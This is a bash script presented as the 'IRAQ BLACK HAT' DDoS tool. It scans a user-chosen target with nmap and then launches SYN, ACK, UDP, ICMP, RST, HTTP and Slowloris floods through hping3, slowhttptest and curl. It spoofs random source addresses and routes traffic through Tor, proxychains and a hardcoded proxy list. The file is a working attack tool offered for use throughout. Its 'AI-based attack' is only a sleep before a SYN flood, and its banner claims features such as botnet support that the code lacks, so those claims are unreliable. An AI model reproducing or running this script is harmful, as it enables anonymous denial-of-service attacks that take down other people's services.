#!/bin/bash

# Function to display a loading spinner
loading_spinner() {
    local delay=0.1
    local spinstr='|/-\'
    echo -n "Loading... "
    for i in {1..10}; do
        for j in {0..3}; do
            printf "\b${spinstr:$j:1}"
            sleep $delay
        done
    done
    printf "\b \n"
}

# Check if script is run as root
if [[ $EUID -ne 0 ]]; then
    echo -e "\033[0;31mError: This script must be run as root (use sudo).\033[0m"
    exit 1
fi

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# Array of colors for the tool name
COLORS=("$RED" "$GREEN" "$YELLOW" "$BLUE" "$PURPLE" "$CYAN")

# Randomly select a color for the tool name
TOOL_COLOR=${COLORS[$RANDOM % ${#COLORS[@]}]}

# Authentication
USERNAME="DoDs_TOOl"
PASSWORD="R@ndOmP@sswOrd123!"

# Install required tools
install_dependencies() {
    echo -e "${YELLOW}Updating package lists...${NC}"
    apt-get update || echo -e "${RED}Failed to update package lists. Trying with a different mirror...${NC}"

    # Use a different mirror if the default one fails
    if ! apt-get update; then
        echo -e "${YELLOW}Switching to a different mirror...${NC}"
        sed -i 's|http.kali.org|mirror.rackspace.com/kali|g' /etc/apt/sources.list
        apt-get update || { echo -e "${RED}Failed to update package lists. Exiting...${NC}"; exit 1; }
    fi

    echo -e "${YELLOW}Installing required tools...${NC}"
    apt-get install -y figlet tor hping3 curl iptables proxychains slowhttptest nmap siege || {
        echo -e "${RED}Failed to install some packages. Continuing with available tools...${NC}"
    }
}

# Set up firewall to block all incoming traffic
setup_firewall() {
    echo -e "${YELLOW}Setting up firewall to block all incoming traffic...${NC}"

    # Flush existing rules
    iptables -F
    iptables -X

    # Block all incoming traffic
    iptables -P INPUT DROP
    iptables -P FORWARD DROP

    # Allow outgoing traffic
    iptables -P OUTPUT ACCEPT

    echo -e "${GREEN}Firewall configured to block all incoming traffic.${NC}"
}

# Gather server information and suggest best attack
nmap_based_attack() {
    local target=$1

    echo -e "${YELLOW}Gathering information about the target...${NC}"

    # Use nmap to scan the target
    echo -e "${BLUE}Running nmap scan...${NC}"
    nmap -sV -O $target

    # Use curl to get server headers
    echo -e "${BLUE}Fetching server headers...${NC}"
    curl -I $target

    # Suggest best attack based on open ports and server type
    echo -e "${YELLOW}Suggesting best attack type...${NC}"
    if curl -I $target | grep -i "Server: Apache"; then
        echo -e "${GREEN}Suggested attack: HTTP Flood${NC}"
    elif nmap -sV -O $target | grep -i "80/tcp open"; then
        echo -e "${GREEN}Suggested attack: SYN Flood${NC}"
    else
        echo -e "${GREEN}Suggested attack: ICMP Flood${NC}"
    fi

    read -p "Do you want to proceed with the attack? (y/n): " proceed
    if [[ "$proceed" == "y" || "$proceed" == "Y" ]]; then
        return 0
    else
        return 1
    fi
}

# AI-Based Attack
ai_based_attack() {
    local target=$1
    local port=$2

    echo -e "${YELLOW}Starting AI-Based Attack on $target:$port${NC}"
    echo -e "${GREEN}AI is analyzing the target and optimizing the attack...${NC}"

    # Simulate AI analysis
    sleep 5

    # Start the attack
    echo -e "${GREEN}AI has selected the optimal attack strategy. Launching attack...${NC}"
    proxychains hping3 -S -p $port --flood --rand-source $target
}

# Manual Attack
manual_attack() {
    local target=$1
    local port=$2

    echo -e "${YELLOW}Select attack type:${NC}"
    echo -e "${BLUE}1. HTTP Flood       2. HTTPS Flood      3. SYN Flood${NC}"
    echo -e "${BLUE}4. ACK Flood       5. TCP Flood        6. UDP Flood${NC}"
    echo -e "${BLUE}7. ICMP Flood      8. Slowloris        9. RST Flood${NC}"
    read -p "Enter your choice (1-9): " attack_choice

    # Proxy List
    PROXIES=(
        "103.156.17.61:8080" "45.77.56.114:3128" "138.197.157.32:8080" 
        "167.71.5.83:8080" "165.22.223.92:8080" "209.97.150.167:3128"
    )

    # Get a random proxy
    get_random_proxy() {
        local proxy_index=$((RANDOM % ${#PROXIES[@]}))
        echo "${PROXIES[$proxy_index]}"
    }

    # Hide IP using Tor and ProxyChains
    hide_ip() {
        echo -e "${YELLOW}Starting Tor and ProxyChains for anonymity...${NC}"
        service tor start
        echo -e "${GREEN}IP hidden using Tor and ProxyChains.${NC}"
    }

    # Function to stop the attack
    stop_attack() {
        echo -e "${RED}Stopping attack...${NC}"
        pkill -f "hping3"
        pkill -f "slowhttptest"
        pkill -f "curl"
        pkill -f "siege"
        echo -e "${GREEN}Attack stopped.${NC}"
        exit 0
    }

    # Send attack requests
    send_requests() {
        local target=$1
        local port=$2
        local attack_type=$3
        local proxy=$(get_random_proxy)

        # Send 5000 requests per second
        for i in {1..5000}; do
            case $attack_type in
                1) proxychains curl -s -o /dev/null -X GET "$target" ;;
                2) proxychains curl -s -o /dev/null -X GET "https://$target" ;;
                3) proxychains hping3 -S -p $port --flood --rand-source $target ;;
                4) proxychains hping3 -A -p $port --flood --rand-source $target ;;
                5) proxychains hping3 -p $port --flood --rand-source $target ;;
                6) proxychains hping3 --udp -p $port --flood --rand-source $target ;;
                7) proxychains hping3 --icmp -p $port --flood --rand-source $target ;;
                8) proxychains slowhttptest -c 5000 -H -i 10 -r 200 -t GET -u "$target" -x 24 -p 3 ;;  # Adjusted to 5000 requests
                9) proxychains hping3 --rst -p $port --flood --rand-source $target ;;
            esac
            echo "Request sent to $target:$port via proxy $proxy"
        done
    }

    # Start attack
    start_attack() {
        local target=$1
        local port=$2
        local attack_type=$3

        for i in {1..10}; do  # Adjusted to 10 threads
            send_requests "$target" "$port" "$attack_type" &
        done
        wait
    }

    # Execute attack based on selected attack type
    case $attack_choice in
        1)
            echo -e "${BLUE}Starting HTTP Flood on $target:$port${NC}"
            hide_ip
            start_attack "$target" "$port" 1
            ;;
        2)
            echo -e "${BLUE}Starting HTTPS Flood on $target:$port${NC}"
            hide_ip
            start_attack "$target" "$port" 2
            ;;
        3)
            echo -e "${BLUE}Starting SYN Flood on $target:$port${NC}"
            hide_ip
            start_attack "$target" "$port" 3
            ;;
        4)
            echo -e "${BLUE}Starting ACK Flood on $target:$port${NC}"
            hide_ip
            start_attack "$target" "$port" 4
            ;;
        5)
            echo -e "${BLUE}Starting TCP Flood on $target:$port${NC}"
            hide_ip
            start_attack "$target" "$port" 5
            ;;
        6)
            echo -e "${BLUE}Starting UDP Flood on $target:$port${NC}"
            hide_ip
            start_attack "$target" "$port" 6
            ;;
        7)
            echo -e "${BLUE}Starting ICMP Flood on $target:$port${NC}"
            hide_ip
            start_attack "$target" "$port" 7
            ;;
        8)
            echo -e "${BLUE}Starting Slowloris on $target:$port${NC}"
            hide_ip
            start_attack "$target" "$port" 8
            ;;
        9)
            echo -e "${BLUE}Starting RST Flood on $target:$port${NC}"
            hide_ip
            start_attack "$target" "$port" 9
            ;;
        *)
            echo -e "${RED}Invalid choice! Exiting...${NC}"
            exit 1
            ;;
    esac

    # Stop attack option
    trap stop_attack SIGINT

    echo -e "${YELLOW}Press Ctrl+C to stop the attack.${NC}"
}

# Display banner and introduction
clear
loading_spinner
clear
echo -e "${TOOL_COLOR}$(figlet -f big -c "IRAQ BLACK HAT")${NC}"
echo -e "${TOOL_COLOR}   Ultimate DDoS Tool - Professional Version   ${NC}\n"

# Introduction
echo -e "${YELLOW}Welcome to IRAQ BLACK HAT - Ultimate DDoS Tool${NC}"
echo -e "${BLUE}=====================================================${NC}"
echo -e "${GREEN}This tool is designed for advanced DDoS attacks with the following features:${NC}"
echo -e "1. **Nmap-Based Attack:**"
echo -e "   - Collects detailed information about the target server and suggests the best attack."
echo -e "2. **AI-Based Attack:**"
echo -e "   - Uses AI to analyze the target and optimize the attack strategy."
echo -e "3. **Manual Attack:**"
echo -e "   - Allows you to manually select the attack type and port."
echo -e "4. **Anonymity & Protection:**"
echo -e "   - Uses Tor and Proxychains to hide your IP address."
echo -e "   - Configures a firewall to block all incoming traffic, protecting you from reverse attacks."
echo -e "5. **Botnet Support:**"
echo -e "   - Distributes the attack across multiple devices (Botnet) for increased power."
echo -e "6. **Dynamic Attack Techniques:**"
echo -e "   - Uses advanced techniques like packet fragmentation and port hopping to bypass firewalls."
echo -e "7. **User-Friendly Interface:**"
echo -e "   - Easy-to-use menu with clear instructions."
echo -e "8. **Stop Attack Option:**"
echo -e "   - Allows you to stop the attack at any time with a simple command (Ctrl+C)."
echo -e "${BLUE}=====================================================${NC}\n"

# Authentication
read -p "Username: " input_username
read -s -p "Password: " input_password
echo ""

if [[ "$input_username" != "$USERNAME" || "$input_password" != "$PASSWORD" ]]; then
    echo -e "${RED}Authentication failed! Exiting...${NC}"
    exit 1
fi

echo -e "${GREEN}Authentication successful!${NC}\n"

# Enter target
read -p "Enter target (URL or IP): " target

# Select attack type
echo -e "${YELLOW}Select attack type:${NC}"
echo -e "${BLUE}1. Nmap-Based Attack${NC}"
echo -e "${BLUE}2. AI-Based Attack${NC}"
echo -e "${BLUE}3. Manual Attack${NC}"
read -p "Enter your choice (1-3): " attack_type

# Execute attack based on selected attack type
case $attack_type in
    1)
        if nmap_based_attack "$target"; then
            read -p "Enter port: " port
            manual_attack "$target" "$port"
        fi
        ;;
    2)
        read -p "Enter port: " port
        ai_based_attack "$target" "$port"
        ;;
    3)
        read -p "Enter port: " port
        manual_attack "$target" "$port"
        ;;
    *)
        echo -e "${RED}Invalid choice! Exiting...${NC}"
        exit 1
        ;;
esac
